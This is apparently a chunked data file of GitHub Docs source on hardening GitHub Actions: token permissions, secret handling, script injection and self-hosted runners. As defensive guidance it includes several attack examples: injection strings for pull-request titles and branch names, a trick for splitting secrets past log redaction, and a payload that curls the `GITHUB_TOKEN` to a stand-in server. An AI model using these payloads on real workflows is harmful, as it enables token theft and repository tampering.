`GITHUB_TOKEN` are initially set to the default setting for the enterprise, organization, or repository. If the default is set to the restricted permissions at any of these levels then this will apply to the relevant repositories. For example, if you choose the restricted default at the organization level then all repositories in that organization will use the restricted permissions as the default. The permissions are then adjusted based on any configuration within the workflow file, first at the workflow level and then at the job level. Finally, if the workflow was triggered by a pull request from a forked repository, and the **Send write tokens to workflows from pull requests** setting is not selected, the permissions are adjusted to change any write permissions to read only.\n\n\n\nGranting additional permissions\n\nIf you need a token that requires permissions that aren't available in the `GITHUB_TOKEN`, you can create a {% data variables.", "Y2h1bmtfNF9pbmRleF8xODI=": "product.prodname_github_app %} and generate an installation access token within your workflow. For more information, see \"AUTOTITLE.\" Alternatively, you can create a {% data variables.product.pat_generic %}, store it as a secret in your repository, and use the token in your workflow with the {%raw%}`${{ secrets.SECRET_NAME }}`{% endraw %} syntax. For more information, see \"AUTOTITLE\" and \"AUTOTITLE.\"\n\n\n\nFurther reading\n\n- \"AUTOTITLE\"\n\n", "Y2h1bmtfMF9pbmRleF8xODM=": "\n\nOverview\n\nThis guide explains how to configure security hardening for certain {% data variables.product.prodname_actions %} features. If the {% data variables.product.prodname_actions %} concepts are unfamiliar, see \"AUTOTITLE.\"\n\n\n\nUsing secrets\n\nSensitive values should never be stored as plaintext in workflow files, but rather as secrets. Secrets can be configured at the organization, repository, or environment level, and allow you to store sensitive information in {% data variables.product.product_name %}.\n\n{% ifversion fpt or ghec %}\nSecrets use Libsodium sealed boxes, so that they are encrypted before reaching {% data variables.product.product_name %}. This occurs when the secret is submitted using the UI or through the REST API. This client-side encryption helps minimize the risks related to accidental logging (for example, exception logs and request logs, among others) within {% data variables.product.product_name %}'s infrastructure. Once the secret is uploaded, {% data variables.product.product_name %} is then able to decrypt it so that it can be injected into the workflow runtime.\n{% endif %}\n\nTo help prevent accidental disclosure, {% data variables.product.product_name %} uses a mechanism that attempts to redact any secrets that appear in run logs. This redaction looks for exact matches of any configured secrets used within the job, as well as common encodings of the values, such as Base64. However, because there are multiple ways a secret value can be transformed, this redaction is not guaranteed. Additionally, the runner can only redact secrets used within the current job. As a result, there are certain proactive steps and good practices you should follow to help ensure secrets are redacted, and to limit other risks associated with secrets:\n\n- **Never use structured data as a secret**\n  - Structured data can cause secret redaction within logs to fail, because redaction largely relies on finding an exact match for the specific secret value. For example, do not use a blob of JSON, XML, or YAML (or sim", "Y2h1bmtfMV9pbmRleF8xODM=": "ilar) to encapsulate a secret value, as this significantly reduces the probability the secrets will be properly redacted. Instead, create individual secrets for each sensitive value.\n- **Register all secrets used within workflows**\n  - If a secret is used to generate another sensitive value within a workflow, that generated value should be formally registered as a secret, so that it will be redacted if it ever appears in the logs. For example, if using a private key to generate a signed JWT to access a web API, be sure to register that JWT as a secret or else it won\u2019t be redacted if it ever enters the log output.\n  - Registering secrets applies to any sort of transformation/encoding as well. If your secret is transformed in some way (such as Base64 or URL-encoded), be sure to register the new value as a secret too.\n- **Audit how secrets are handled**\n  - Audit how secrets are used, to help ensure they\u2019re being handled as expected. You can do this by reviewing the source code of the repository executing the workflow, and checking any actions used in the workflow. For example, check that they\u2019re not sent to unintended hosts, or explicitly being printed to log output.\n  - View the run logs for your workflow after testing valid/invalid inputs, and check that secrets are properly redacted, or not shown. It's not always obvious how a command or tool you\u2019re invoking will send errors to `STDOUT` and `STDERR`, and secrets might subsequently end up in error logs. As a result, it is good practice to manually review the workflow logs after testing valid and invalid inputs. For information on how to clean up workflow logs that may unintentionally contain sensitive data, see \"AUTOTITLE.\"\n- **Use credentials that are minimally scoped**\n  - Make sure the credentials being used within workflows have the least privileges required, and be mindful that any user with write access to your repository has read access to all secrets configured in your repository.\n  - Actions can use the `GITHUB_TOKEN` by accessing it from the `github.tok", "Y2h1bmtfMl9pbmRleF8xODM=": "en` context. For more information, see \"AUTOTITLE.\" You should therefore make sure that the `GITHUB_TOKEN` is granted the minimum required permissions. It's good security practice to set the default permission for the `GITHUB_TOKEN` to read access only for repository contents. The permissions can then be increased, as required, for individual jobs within the workflow file. For more information, see \"AUTOTITLE.\"\n- **Audit and rotate registered secrets**\n  - Periodically review the registered secrets to confirm they are still required. Remove those that are no longer needed.\n  - Rotate secrets periodically to reduce the window of time during which a compromised secret is valid.\n- **Consider requiring review for access to secrets**\n  - You can use required reviewers to protect environment secrets. A workflow job cannot access environment secrets until approval is granted by a reviewer. For more information about storing secrets in environments or requiring reviews for environments, see \"AUTOTITLE\" and \"AUTOTITLE.\"\n\n{% warning %}\n\n**Warning**: Any user with write access to your repository has read access to all secrets configured in your repository. Therefore, you should ensure that the credentials being used within workflows have the least privileges required.\n\n{% endwarning %}\n\n\n\nUsing `CODEOWNERS` to monitor changes\n\nYou can use the `CODEOWNERS` feature to control how changes are made to your workflow files. For example, if all your workflow files are stored in `.github/workflows`, you can add this directory to the code owners list, so that any proposed changes to these files will first require approval from a designated reviewer.\n\nFor more information, see \"AUTOTITLE.\"\n\n\n\nUnderstanding the risk of script injections\n\nWhen creating workflows, custom actions, and composite actions actions, you should always consider whether your code might execute untrusted input from attackers. This can occur when an attacker adds malicious commands and scripts to a context. When your workflow runs, those strings might be interpret", "Y2h1bmtfM19pbmRleF8xODM=": "ed as code which is then executed on the runner.\n\n Attackers can add their own malicious content to the `github` context, which should be treated as potentially untrusted input. These contexts typically end with `body`, `default_branch`, `email`, `head_ref`, `label`, `message`, `name`, `page_name`,`ref`, and `title`.  For example: `github.event.issue.title`, or `github.event.pull_request.body`.\n\n You should ensure that these values do not flow directly into workflows, actions, API calls, or anywhere else where they could be interpreted as executable code. By adopting the same defensive programming posture you would use for any other privileged application code, you can help security harden your use of {% data variables.product.prodname_actions %}. For information on some of the steps an attacker could take, see \"AUTOTITLE.\"\n\nIn addition, there are other less obvious sources of potentially untrusted input, such as branch names and email addresses, which can be quite flexible in terms of their permitted content. For example, `zzz\";echo${IFS}\"hello\";#` would be a valid branch name and would be a possible attack vector for a target repository.\n\nThe following sections explain how you can help mitigate the risk of script injection.\n\n\n\nExample of a script injection attack\n\nA script injection attack can occur directly within a workflow's inline script. In the following example, an action uses an expression to test the validity of a pull request title, but also adds the risk of script injection:\n\n{% raw %}\n\n```yaml\n      - name: Check PR title\n        run: |\n          title=\"${{ github.event.pull_request.title }}\"\n          if [[ $title =~ ^octocat ]]; then\n          echo \"PR title starts with 'octocat'\"\n          exit 0\n          else\n          echo \"PR title did not start with 'octocat'\"\n          exit 1\n          fi\n```\n\n{% endraw %}\n\nThis example is vulnerable to script injection because the `run` command executes within a temporary shell script on the runner. Before the shell script is run, the expressions inside {% ", "Y2h1bmtfNF9pbmRleF8xODM=": "raw %}`${{ }}`{% endraw %} are evaluated and then substituted with the resulting values, which can make it vulnerable to shell command injection.\n\nTo inject commands into this workflow, the attacker could create a pull request with a title of  `a\"; ls $GITHUB_WORKSPACE\"`:\n\n!Screenshot of the title of a pull request in edit mode. A new title has been entered in the field: a\"; ls $GITHUB_WORKSPACE\".\n\nIn this example, the `\"` character is used to interrupt the {% raw %}`title=\"${{ github.event.pull_request.title }}\"`{% endraw %} statement, allowing the `ls` command to be executed on the runner. You can see the output of the `ls` command in the log:\n\n```shell\nRun title=\"a\"; ls $GITHUB_WORKSPACE\"\"\nREADME.md\ncode.yml\nexample.js\n```\n\n\n\nGood practices for mitigating script injection attacks\n\nThere are a number of different approaches available to help you mitigate the risk of script injection:\n\n\n\nUsing an action instead of an inline script (recommended)\n\nThe recommended approach is to create an action that processes the context value as an argument. This approach is not vulnerable to the injection attack, as the context value is not used to generate a shell script, but is instead passed to the action as an argument:\n\n{% raw %}\n\n```yaml\nuses: fakeaction/checktitle@v3\nwith:\n    title: ${{ github.event.pull_request.title }}\n```\n\n{% endraw %}\n\n\n\nUsing an intermediate environment variable\n\nFor inline scripts, the preferred approach to handling untrusted input is to set the value of the expression to an intermediate environment variable.\n\nThe following example uses Bash to process the `github.event.pull_request.title` value as an environment variable:\n\n{% raw %}\n\n```yaml\n      - name: Check PR title\n        env:\n          TITLE: ${{ github.event.pull_request.title }}\n        run: |\n          if [[ \"$TITLE\" =~ ^octocat ]]; then\n          echo \"PR title starts with 'octocat'\"\n          exit 0\n          else\n          echo \"PR title did not start with 'octocat'\"\n          exit 1\n          fi\n```\n\n{% endraw %}\n\nIn this example, th", "Y2h1bmtfNV9pbmRleF8xODM=": "e attempted script injection is unsuccessful, which is reflected by the following lines in the log:\n\n```shell\n   env:\n     TITLE: a\"; ls $GITHUB_WORKSPACE\"\nPR title did not start with 'octocat'\n```\n\nWith this approach, the value of the {% raw %}`${{ github.event.issue.title }}`{% endraw %} expression is stored in memory and used as a variable, and doesn't interact with the script generation process. In addition, consider using double quote shell variables to avoid word splitting, but this is one of many general recommendations for writing shell scripts, and is not specific to {% data variables.product.prodname_actions %}.\n\n{% ifversion fpt or ghec %}\n\n\n\nUsing starter workflows for code scanning\n\n{% data reusables.advanced-security.starter-workflows-beta %}\n{% data variables.product.prodname_code_scanning_caps %} allows you to find security vulnerabilities before they reach production. {% data variables.product.product_name %} provides starter workflows for {% data variables.product.prodname_code_scanning %}. You can use these suggested workflows to construct your {% data variables.product.prodname_code_scanning %} workflows, instead of starting from scratch. {% data variables.product.company_short%}'s workflow, the {% data variables.code-scanning.codeql_workflow %}, is powered by {% data variables.product.prodname_codeql %}. There are also third-party starter workflows available.\n\nFor more information, see \"AUTOTITLE\" and \"AUTOTITLE.\"\n\n{% endif %}\n\n\n\nRestricting permissions for tokens\n\nTo help mitigate the risk of an exposed token, consider restricting the assigned permissions. For more information, see \"AUTOTITLE.\"\n\n{% ifversion fpt or ghec or ghes %}\n\n\n\nUsing OpenID Connect to access cloud resources\n\n{% data reusables.actions.about-oidc-short-overview %}\n\n{% endif %}\n\n\n\nUsing third-party actions\n\nThe individual jobs in a workflow can interact with (and compromise) other jobs. For example, a job querying the environment variables used by a later job, writing files to a shared directory that a later job processes", "Y2h1bmtfNl9pbmRleF8xODM=": ", or even more directly by interacting with the Docker socket and inspecting other running containers and executing commands in them.\n\nThis means that a compromise of a single action within a workflow can be very significant, as that compromised action would have access to all secrets configured on your repository, and may be able to use the `GITHUB_TOKEN` to write to the repository. Consequently, there is significant risk in sourcing actions from third-party repositories on {% data variables.product.prodname_dotcom %}. For information on some of the steps an attacker could take, see \"AUTOTITLE.\"\n\nYou can help mitigate this risk by following these good practices:\n\n- **Pin actions to a full length commit SHA**\n\n  Pinning an action to a full length commit SHA is currently the only way to use an action as an immutable release. Pinning to a particular SHA helps mitigate the risk of a bad actor adding a backdoor to the action's repository, as they would need to generate a SHA-1 collision for a valid Git object payload. {% data reusables.actions.actions-pin-commit-sha %}\n\n- **Audit the source code of the action**\n\n  Ensure that the action is handling the content of your repository and secrets as expected. For example, check that secrets are not sent to unintended hosts, or are not inadvertently logged.\n\n- **Pin actions to a tag only if you trust the creator**\n\n  Although pinning to a commit SHA is the most secure option, specifying a tag is more convenient and is widely used. If you\u2019d like to specify a tag, then be sure that you trust the action's creators. The \u2018Verified creator\u2019 badge on {% data variables.product.prodname_marketplace %} is a useful signal, as it indicates that the action was written by a team whose identity has been verified by {% data variables.product.prodname_dotcom %}. Note that there is risk to this approach even if you trust the author, because a tag can be moved or deleted if a bad actor gains access to the repository storing the action.\n\n\n\nReusing third-party workflows\n\nThe same principles des", "Y2h1bmtfN19pbmRleF8xODM=": "cribed above for using third-party actions also apply to using third-party workflows. You can help mitigate the risks associated with reusing workflows by following the same good practices outlined above. For more information, see \"AUTOTITLE.\"\n\n{% ifversion not ghae %}\n\n\n\nUsing {% data variables.product.prodname_dependabot_version_updates %} to keep actions up to date\n\nYou can use {% data variables.product.prodname_dependabot_version_updates %} to ensure that references to actions{% ifversion dependabot-updates-actions-reusable-workflows %} and reusable workflows{% endif %} used in your repository are kept up to date. Actions are often updated with bug fixes and new features to make automated processes more reliable, faster, and safer. {% data variables.product.prodname_dependabot_version_updates %} take the effort out of maintaining your dependencies as {% data variables.product.prodname_dependabot %} does this automatically for you. For more information, see \"AUTOTITLE.\"\n{% endif %}\n\n{% ifversion internal-actions %}\n\n\n\nAllowing workflows to access internal {% ifversion private-actions %}and private {% endif %}repositories\n\n{% data reusables.actions.outside-collaborators-actions %} For more information, see \"AUTOTITLE.\"\n\n{% data reusables.actions.scoped-token-note %}\n\n{% endif %}\n\n{% ifversion allow-actions-to-approve-pr %}\n\n\n\nPreventing {% data variables.product.prodname_actions %} from {% ifversion allow-actions-to-approve-pr-with-ent-repo %}creating or {% endif %}approving pull requests\n\n{% data reusables.actions.workflow-pr-approval-permissions-intro %} Allowing workflows, or any other automation, to {% ifversion allow-actions-to-approve-pr-with-ent-repo %}create or {% endif %}approve pull requests could be a security risk if the pull request is merged without proper oversight.\n\nFor more information on how to configure this setting, see {% ifversion allow-actions-to-approve-pr-with-ent-repo %}{% ifversion ghes or ghec or ghae %}\"AUTOTITLE\",{% endif %}{% endif %} \"Disabling or limiting {% data variables.produ", "Y2h1bmtfOF9pbmRleF8xODM=": "ct.prodname_actions %} for your organization\"{% ifversion allow-actions-to-approve-pr-with-ent-repo %}, and \"AUTOTITLE\"{% endif %}.\n{% endif %}\n\n\n\nUsing OpenSSF Scorecards to secure workflows\n\nScorecards is an automated security tool that flags risky supply chain practices. You can use the Scorecards action and starter workflow to follow best security practices. Once configured, the Scorecards action runs automatically on repository changes, and alerts developers about risky supply chain practices using the built-in code scanning experience. The Scorecards project runs a number of checks, including script injection attacks, token permissions, and pinned actions.\n\n\n\nPotential impact of a compromised runner\n\nThese sections consider some of the steps an attacker can take if they're able to run malicious commands on a {% data variables.product.prodname_actions %} runner.\n\n{% note %}\n\n**Note:** {% data variables.product.prodname_dotcom %}-hosted runners do not scan for malicious code downloaded by a user during their job, such as a compromised third party library.\n\n{% endnote %}\n\n\n\nAccessing secrets\n\nWorkflows triggered from a forked repository using the `pull_request` event have read-only permissions and have no access to secrets. However, these permissions differ for various event triggers such as `issue_comment`, `issues`, `push` and `pull_request` from a branch within the repository, where the attacker could attempt to steal repository secrets or use the write permission of the job's `GITHUB_TOKEN`.\n\n- If the secret or token is set to an environment variable, it can be directly accessed through the environment using `printenv`.\n- If the secret is used directly in an expression, the generated shell script is stored on-disk and is accessible.\n- For a custom action, the risk can vary depending on how a program is using the secret it obtained from the argument:\n\n  {% raw %}\n\n  ```yaml\n  uses: fakeaction/publish@v3\n  with:\n      key: ${{ secrets.PUBLISH_KEY }}\n  ```\n\n  {% endraw %}\n\nAlthough {% data variables.product.p", "Y2h1bmtfOV9pbmRleF8xODM=": "rodname_actions %} scrubs secrets from memory that are not referenced in the workflow (or an included action), the `GITHUB_TOKEN` and any referenced secrets can be harvested by a determined attacker.\n\n\n\nExfiltrating data from a runner\n\nAn attacker can exfiltrate any stolen secrets or other data from the runner. To help prevent accidental secret disclosure, {% data variables.product.prodname_actions %} automatically redact secrets printed to the log, but this is not a true security boundary because secrets can be intentionally sent to the log. For example, obfuscated secrets can be exfiltrated using `echo ${SOME_SECRET:0:4}; echo ${SOME_SECRET:4:200};`. In addition, since the attacker may run arbitrary commands, they could use HTTP requests to send secrets or other repository data to an external server.\n\n\n\nStealing the job's `GITHUB_TOKEN`\n\nIt is possible for an attacker to steal a job's `GITHUB_TOKEN`. The {% data variables.product.prodname_actions %} runner automatically receives a generated `GITHUB_TOKEN` with permissions that are limited to just the repository that contains the workflow, and the token expires after the job has completed. Once expired, the token is no longer useful to an attacker. To work around this limitation, they can automate the attack and perform it in fractions of a second by calling an attacker-controlled server with the token, for example: `a\"; set +e; curl http://example.com?token=$GITHUB_TOKEN;#`.\n\n\n\nModifying the contents of a repository\n\nThe attacker server can use the {% ifversion fpt or ghec %}{% data variables.product.prodname_dotcom %}{% else %}{% data variables.product.product_name %}{% endif %} API to modify repository content, including releases, if the assigned permissions of `GITHUB_TOKEN` are not restricted.\n\n\n\nConsidering cross-repository access\n\n{% data variables.product.prodname_actions %} is intentionally scoped for a single repository at a time. The `GITHUB_TOKEN` grants the same level of access as a write-access user, because any write-access user can access this to", "Y2h1bmtfMTBfaW5kZXhfMTgz": "ken by creating or modifying a workflow file, elevating the permissions of the `GITHUB_TOKEN` if necessary. Users have specific permissions for each repository, so allowing the `GITHUB_TOKEN` for one repository to grant access to another would impact the {% data variables.product.prodname_dotcom %} permission model if not implemented carefully. Similarly, caution must be taken when adding {% data variables.product.prodname_dotcom %} authentication tokens to a workflow, because this can also affect the {% data variables.product.prodname_dotcom %} permission model by inadvertently granting broad access to collaborators.\n\nIf your organization is owned by an enterprise account, then you can share and reuse {% data variables.product.prodname_actions %} by storing them in internal repositories. For more information, see \"AUTOTITLE.\"\n\nYou can perform other privileged, cross-repository interactions by referencing a {% data variables.product.prodname_dotcom %} authentication token or SSH key as a secret within the workflow. Because many authentication token types do not allow for granular access to specific resources, there is significant risk in using the wrong token type, as it can grant much broader access than intended.\n\nThis list describes the recommended approaches for accessing repository data within a workflow, in descending order of preference:\n\n1. **The `GITHUB_TOKEN`**\n    - This token is intentionally scoped to the single repository that invoked the workflow, and can have the same level of access as a write-access user on the repository. The token is created before each job begins and expires when the job is finished. For more information, see \"AUTOTITLE.\"\n    - The `GITHUB_TOKEN` should be used whenever possible.\n1. **Repository deploy key**\n    - Deploy keys are one of the only credential types that grant read or write access to a single repository, and can be used to interact with another repository within a workflow. For more information, see \"AUTOTITLE.\"\n    - Note that deploy keys can only clone and push", "Y2h1bmtfMTFfaW5kZXhfMTgz": " to the repository using Git, and cannot be used to interact with the REST or GraphQL API, so they may not be appropriate for your requirements.\n1. **{% data variables.product.prodname_github_app %} tokens**\n    - {% data variables.product.prodname_github_apps %} can be installed on select repositories, and even have granular permissions on the resources within them. You could create a {% data variables.product.prodname_github_app %} internal to your organization, install it on the repositories you need access to within your workflow, and authenticate as the installation within your workflow to access those repositories. For more information, see \"AUTOTITLE.\"\n1. **{% data variables.product.pat_generic %}s**\n    - You should never use a {% data variables.product.pat_v1 %}. These tokens grant access to all repositories within the organizations that you have access to, as well as all personal repositories in your personal account. This indirectly grants broad access to all write-access users of the repository the workflow is in.\n    - If you do use a {% data variables.product.pat_generic %}, you should never use a {% data variables.product.pat_generic %} from your own account. If you later leave an organization, workflows using this token will immediately break, and debugging this issue can be challenging. Instead, you should use a {% ifversion pat-v2%}{% data variables.product.pat_v2 %}s{% else %}{% data variables.product.pat_generic %}s{% endif %} for a new account that belongs to your organization and that is only granted access to the specific repositories that are needed for the workflow. Note that this approach is not scalable and should be avoided in favor of alternatives, such as deploy keys.\n1. **SSH keys on a personal account**\n    - Workflows should never use the SSH keys on a personal account. Similar to {% data variables.product.pat_v1_plural %}, they grant read/write permissions to all of your personal repositories as well as all the repositories you have access to through organization membership.  Thi", "Y2h1bmtfMTJfaW5kZXhfMTgz": "s indirectly grants broad access to all write-access users of the repository the workflow is in. If you're intending to use an SSH key because you only need to perform repository clones or pushes, and do not need to interact with public APIs, then you should use individual deploy keys instead.\n\n\n\nHardening for {% data variables.product.prodname_dotcom %}-hosted runners\n\n{% data variables.product.prodname_dotcom %}-hosted runners take measures to help you mitigate security risks.\n\n{% ifversion actions-sbom %}\n\n\n\nReviewing the supply chain for {% data variables.product.prodname_dotcom %}-hosted runners\n\nYou can view a software bill of materials (SBOM) to see what software was pre-installed on the {% data variables.product.prodname_dotcom %}-hosted runner image used during your workflow runs. You can provide your users with the SBOM which they can run through a vulnerability scanner to validate if there are any vulnerabilities in the product. If you are building artifacts, you can include this SBOM in your bill of materials for a comprehensive list of everything that went into creating your software.\n\nSBOMs are available for Ubuntu, Windows, and macOS runner images. You can locate the SBOM for your build in the release assets at https://github.com/actions/runner-images/releases. An SBOM with a filename in the format of `sbom.IMAGE-NAME.json.zip` can be found in the attachments of each release.\n\n{% endif %}\n\n\n\nDenying access to hosts\n\n{% data reusables.actions.runners-etc-hosts-file %}{%ifversion fpt or ghec or ghes %}For more information, see \"AUTOTITLE.\"{% endif %}\n\n\n\nHardening for self-hosted runners\n\n{% ifversion fpt or ghec %}\n**{% data variables.product.prodname_dotcom %}-hosted** runners execute code within ephemeral and clean isolated virtual machines, meaning there is no way to persistently compromise this environment, or otherwise gain access to more information than was placed in this environment during the bootstrap process.\n{% endif %}\n\n{% ifversion fpt or ghec %}**Self-hosted**{% elsif ghes or ghae %}Se", "Y2h1bmtfMTNfaW5kZXhfMTgz": "lf-hosted{% endif %} runners for {% data variables.product.product_name %} do not have guarantees around running in ephemeral clean virtual machines, and can be persistently compromised by untrusted code in a workflow.\n\n{% ifversion fpt or ghec %}As a result, self-hosted runners should almost never be used for public repositories on {% data variables.product.product_name %}, because any user can open pull requests against the repository and compromise the environment. Similarly, be{% elsif ghes or ghae %}Be{% endif %} cautious when using self-hosted runners on private or internal repositories, as anyone who can fork the repository and open a pull request (generally those with read access to the repository) are able to compromise the self-hosted runner environment, including gaining access to secrets and the `GITHUB_TOKEN` which, depending on its settings, can grant write access to the repository. Although workflows can control access to environment secrets by using environments and required reviews, these workflows are not run in an isolated environment and are still susceptible to the same risks when run on a self-hosted runner.\n\n{% ifversion actions-disable-repo-runners %}\n\n{% data reusables.actions.disable-selfhosted-runners-crossrefs %}\n\n{% endif %}\n\nWhen a self-hosted runner is defined at the organization or enterprise level, {% data variables.product.product_name %} can schedule workflows from multiple repositories onto the same runner. Consequently, a security compromise of these environments can result in a wide impact. To help reduce the scope of a compromise, you can create boundaries by organizing your self-hosted runners into separate groups. You can restrict what {% ifversion restrict-groups-to-workflows %}workflows, {% endif %}organizations and repositories can access runner groups. For more information, see \"AUTOTITLE.\"\n\nYou should also consider the environment of the self-hosted runner machines:\n- What sensitive information resides on the machine configured as a self-hosted runner? For example, pr", "Y2h1bmtfMTRfaW5kZXhfMTgz": "ivate SSH keys, API access tokens, among others.\n- Does the machine have network access to sensitive services? For example, Azure or AWS metadata services. The amount of sensitive information in this environment should be kept to a minimum, and you should always be mindful that any user capable of invoking workflows has access to this environment.\n\nSome customers might attempt to partially mitigate these risks by implementing systems that automatically destroy the self-hosted runner after each job execution. However, this approach might not be as effective as intended, as there is no way to guarantee that a self-hosted runner only runs one job. Some jobs will use secrets as command-line arguments which can be seen by another job running on the same runner, such as `ps x -w`. This can lead to secret leakages.\n\n{% ifversion actions-single-use-tokens %}\n\n\n\nUsing just-in-time runners\n\nTo improve runner registration security, you can use the REST API to create ephemeral, just-in-time (JIT) runners. These self-hosted runners perform at most one job before being automatically removed from the repository, organization, or enterprise. For more information about configuring JIT runners, see \"AUTOTITLE.\"\n\n{% note %}\n\n**Note:** Re-using hardware to host JIT runners can risk exposing information from the environment. Use automation to ensure the JIT runner uses a clean environment. For more information, see \"AUTOTITLE.\"\n\n{% endnote %}\n\nOnce you have the config file from the REST API response, you can pass it to the runner at startup.\n\n```shell\n./run.sh --jitconfig ${encoded_jit_config}\n```\n\n{% endif %}\n\n\n\nPlanning your management strategy for self-hosted runners\n\nA self-hosted runner can be added to various levels in your {% data variables.product.prodname_dotcom %} hierarchy: the enterprise, organization, or repository level. This placement determines who will be able to manage the runner:\n\n**Centralized management:**\n- If you plan to have a centralized team own the self-hosted runners, then the recommendation is to add your", "Y2h1bmtfMTVfaW5kZXhfMTgz": " runners at the highest mutual organization or enterprise level. This gives your team a single location to view and manage your runners.\n- If you only have a single organization, then adding your runners at the organization level is effectively the same approach, but you might encounter difficulties if you add another organization in the future.\n\n**Decentralized management:**\n- If each team will manage their own self-hosted runners, then the recommendation is to add the runners at the highest level of team ownership. For example, if each team owns their own organization, then it will be simplest if the runners are added at the organization level too.\n- You could also add runners at the repository level, but this will add management overhead and also increases the numbers of runners you need, since you cannot share runners between repositories.\n\n{% ifversion fpt or ghec or ghes %}\n\n\n\nAuthenticating to your cloud provider\n\nIf you are using {% data variables.product.prodname_actions %} to deploy to a cloud provider, or intend to use HashiCorp Vault for secret management, then its recommended that you consider using OpenID Connect to create short-lived, well-scoped access tokens for your workflow runs. For more information, see \"AUTOTITLE.\"\n\n{% endif %}\n\n\n\nAuditing {% data variables.product.prodname_actions %} events\n\nYou can use the security log to monitor activity for your user account and the audit log to monitor activity in your organization{% ifversion ghec or ghes or ghae %} or enterprise{% endif %}. The security and audit log records the type of action, when it was run, and which personal account performed the action.\n\nFor example, you can use the audit log to track the `org.update_actions_secret` event, which tracks changes to organization secrets.\n\n!Screenshot showing a search for \"action:org.update_actions_secret\" in the audit log for an organization. Two results detail API updates to two secrets that are available to selected repositories.\n\nFor the full list of events that you can find in the audit log for", "Y2h1bmtfMTZfaW5kZXhfMTgz": " each account type, see the following articles:\n\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"\n{%- ifversion ghec or ghes or ghae %}\n- \"AUTOTITLE\"\n{%- endif %}\n\n", "Y2h1bmtfMF9pbmRleF8xODQ=": "\n\nAbout secrets\n\nSecrets are variables that you create in an organization, repository, or repository environment. The secrets that you create are available to use in {% data variables.product.prodname_actions %} workflows. {% data variables.product.prodname_actions %} can only read a secret if you explicitly include the secret in a workflow.\n\n{% data reusables.actions.secrets-org-level-overview %}\n\nFor secrets stored at the environment level, you can enable required reviewers to control access to the secrets. A workflow job cannot access environment secrets until approval is granted by required approvers.\n\n{% ifversion fpt or ghec or ghes %}\n\n{% note %}\n\n**Note**: {% data reusables.actions.about-oidc-short-overview %}\n\n{% endnote %}\n\n{% endif %}\n\n\n\nNaming your secrets\n\nThe following rules apply to secret names:\n\n{% data reusables.actions.actions-secrets-and-variables-naming %}\n\n  For example, a secret created at the environment level must have a unique name in that environment, a secret created at the repository level must have a unique name in that repository, and a secret created at the organization level must have a unique name at that level.\n\n  {% data reusables.codespaces.secret-precedence %} Similarly, if an organization, repository, and environment all have a secret with the same name, the environment-level secret takes precedence.\n\nTo help ensure that {% data variables.product.prodname_dotcom %} redacts your secret in logs, avoid using structured data as the values of secrets. For example, avoid creating secrets that contain JSON or encoded Git blobs.\n\n\n\nAccessing your secrets\n\nTo make a secret available to an action, you must set the secret as an input or environment variable in the workflow file. Review the action's README file to learn about which inputs and environment variables the action expects. For more information, see \"AUTOTITLE.\"\n\nYou can use and read secrets in a workflow file if you have access to edit the file. For more information, see \"AUTOTITLE.\"\n\n{% data reusables.actions.secrets-redacti", "Y2h1bmtfMV9pbmRleF8xODQ=": "on-warning %}\n\nOrganization and repository secrets are read when a workflow run is queued, and environment secrets are read when a job referencing the environment starts.\n\nYou can also manage secrets using the REST API. For more information, see \"AUTOTITLE.\"\n\n\n\nLimiting credential permissions\n\nWhen generating credentials, we recommend that you grant the minimum permissions possible. For example, instead of using personal credentials, use deploy keys or a service account. Consider granting read-only permissions if that's all that is needed, and limit access as much as possible.\n\nWhen generating a {% data variables.product.pat_v1 %}, select the fewest scopes necessary.{% ifversion pat-v2 %} When generating a {% data variables.product.pat_v2 %}, select the minimum permissions and repository access required.{% endif %}\n\nInstead of using a {% data variables.product.pat_generic %}, consider using a {% data variables.product.prodname_github_app %}, which uses fine-grained permissions and short lived tokens{% ifversion pat-v2 %}, similar to a {% data variables.product.pat_v2 %}{% endif %}. Unlike a {% data variables.product.pat_generic %}, a {% data variables.product.prodname_github_app %} is not tied to a user, so the workflow will continue to work even if the user who installed the app leaves your organization. For more information, see \"AUTOTITLE.\"\n\n{% note %}\n\n**Note:** Users with collaborator access to a repository can use the REST API to manage secrets for that repository, and users with admin access to an organization can use the REST API to manage secrets for that organization. For more information, see \"AUTOTITLE.\"\n\n{% endnote %}\n\n\n\nCreating secrets for a repository\n\n{% data reusables.actions.permissions-statement-secrets-variables-repository %}\n\n{% webui %}\n\n{% data reusables.repositories.navigate-to-repo %}\n{% data reusables.repositories.sidebar-settings %}\n{% data reusables.actions.sidebar-secrets-and-variables %}\n{%- ifversion actions-configuration-variables %}\n{% data reusables.actions.actions-secrets-tab %", "Y2h1bmtfMl9pbmRleF8xODQ=": "}\n   !Screenshot of the \"Actions secrets and variables\" page.{% endif %}\n1. Click **New repository secret**.\n1. In the **Name** field, type a name for your secret.\n1. In the **Secret** field, enter the value for your secret.\n1. Click **Add secret**.\n\nIf your repository has environment secrets or can access secrets from the parent organization, then those secrets are also listed on this page.\n\n{% endwebui %}\n\n{% cli %}\n\n{% data reusables.cli.cli-learn-more %}\n\nTo add a repository secret, use the `gh secret set` subcommand. Replace `secret-name` with the name of your secret.\n\n```shell\ngh secret set SECRET_NAME\n```\n\nThe CLI will prompt you to enter a secret value. Alternatively, you can read the value of the secret from a file.\n\n```shell\ngh secret set SECRET_NAME < secret.txt\n```\n\nTo list all secrets for the repository, use the `gh secret list` subcommand.\n\n{% endcli %}\n\n\n\nCreating secrets for an environment\n\n{% data reusables.actions.permissions-statement-secrets-environment %}\n\n{% webui %}\n\n{% data reusables.repositories.navigate-to-repo %}\n{% data reusables.repositories.sidebar-settings %}\n{% data reusables.actions.sidebar-environment %}\n1. Click on the environment that you want to add a secret to.\n1. Under **Environment secrets**, click **Add secret**.\n1. Type a name for your secret in the **Name** input box.\n1. Enter the value for your secret.\n1. Click **Add secret**.\n\n{% endwebui %}\n\n{% cli %}\n\nTo add a secret for an environment, use the `gh secret set` subcommand with the `--env` or `-e` flag followed by the environment name.\n\n```shell\ngh secret set --env ENV_NAME SECRET_NAME\n```\n\nTo list all secrets for an environment, use the `gh secret list` subcommand with the `--env` or `-e` flag followed by the environment name.\n\n```shell\ngh secret list --env ENV_NAME\n```\n\n{% endcli %}\n\n\n\nCreating secrets for an organization\n\n{% data reusables.actions.actions-secrets-variables-repository-access %}\n\n{% data reusables.actions.permissions-statement-secrets-and-variables-organization %}\n\n{% webui %}\n\n{% data reusables.organ", "Y2h1bmtfM19pbmRleF8xODQ=": "izations.navigate-to-org %}\n{% data reusables.organizations.org_settings %}\n{% data reusables.actions.sidebar-secrets-and-variables %}\n{%- ifversion actions-configuration-variables %}\n{% data 